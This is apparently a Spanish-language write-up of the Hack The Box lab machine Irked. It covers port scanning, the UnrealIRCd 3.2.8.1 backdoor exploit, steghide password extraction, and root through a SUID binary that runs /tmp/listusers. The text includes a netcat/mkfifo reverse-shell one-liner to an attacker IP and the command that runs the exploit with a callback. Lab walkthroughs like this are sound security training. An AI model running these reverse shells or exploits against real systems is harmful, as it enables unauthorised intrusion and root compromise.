Irked es una box bastante simple y directa que requiere habilidades básicas de enumeración. Muestra la necesidad de escanear todos los puertos en las máquinas e investigar cualquier binario fuera de lugar encontrado mientras se enumera un sistema. 

Escaneo:
nmap -Pn -p- -open 10.10.10.117 -T4
![[Pasted image 20240511235155.png]]
 Versiones:
 nmap -Pn -sCV -p22,80,111,6697,8067,52895,65534 10.10.10.117 -T4
 ![[Pasted image 20240511235348.png]]
 Encontramos un dominio 
 ![[Pasted image 20240511235425.png]]
 ![[Pasted image 20240511235604.png]]
 Escaneamos por UDP
 sudo nmap -Pn -sU --top-ports 500 10.10.10.117
 ![[Pasted image 20240512001616.png]]

# UnrealIRCd Unreal3.2.8.1
 Luego de enumerar un buen rato encontré lo siguiente  ayudado de hacktricks
https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc
nc 10.10.10.117 6697
![[Pasted image 20240512010844.png]]
Añadimos USER master 0 * master  Nick master encontrado Unreal3.2.8.1, validamos un exploit.
searchsploit UnrealIRCd -w
![[Pasted image 20240512010949.png]]
Como hay varios buscamos en GitHub un exploit que no use metasploit 
https://github.com/chancej715/UnrealIRCd-3.2.8.1-Backdoor-Command-Execution
![[Pasted image 20240512011349.png]]

ejecutamos de acuerdo a las instrucciones.
![[Pasted image 20240512011413.png]]
 python3 script.py 10.10.10.117 6697 10.10.14.2 123
 ![[Pasted image 20240512011658.png]]
 y en netcat tenemos acceso al pc
![[Pasted image 20240512011638.png]]
Mejoramos shell
![[Pasted image 20240512012101.png]]
Enumerando la máquina encontramos otro usuario y su flag esta allí por lo cual debemos ser djmarov
![[Pasted image 20240512012510.png]]
validando el archivo 
cat unrealircd.conf

![[Pasted image 20240512013458.png]]
buscando dentro del directorio /home/djmardov/Documents encuentro de manera oculta el  archivo .backup que contiene un password.
![[Pasted image 20240512021246.png]]

# Esteganografia para jpg ==steghide==
Al principio intenté conectar por ssh con las credenciales encontradas mooc y UPup, pero nada funciono luego leí bien el mensaje del .backup sobre super elite steg backup pw steg de steghide y la imagen obviamente del index.

steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss

![[Pasted image 20240512022059.png]]
validamos pass.txt
![[Pasted image 20240512022240.png]]
nos conectamos por ssh 
ssh djmardov@10.10.10.117
![[Pasted image 20240512022351.png]]
# binario viewuser
Ahora enumerando la máquina con djmardov encuentro el siguiente binario raro 
find / -perm -4000 2>/dev/null
![[Pasted image 20240512022501.png]]

lo ejecuto 
viewuser
![[Pasted image 20240512022729.png]]
Se detecta que se intenta guardar lo obtenido en ese /tmp/listusers.
Busco en internet 
![[Pasted image 20240512023140.png]]
Abro el primer vínculo 
![[Pasted image 20240512023211.png]]
Allí nos dice que se crea el archivo /tmp/listusers y se le da full permisos aparte que dentro de este archivo tendrá la reverse Shell.
creo ese file listusers pero le añado una reverse shell 
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f" > /tmp/listusers
![[Pasted image 20240512023413.png]]
Reviso el netcat y somos root
![[Pasted image 20240512023758.png]]


otra forma de validar el file listuser es haciendo un simple id 
echo id > /tmp/listusers
![[Pasted image 20240512025114.png]]
aca detectamos permisos denegados es decir que si ejecuta comandos.


Maquina media tirando a facil muy chevere sobre todo la parte del steghide hacia mucho no utilizaba esta herramienta. 
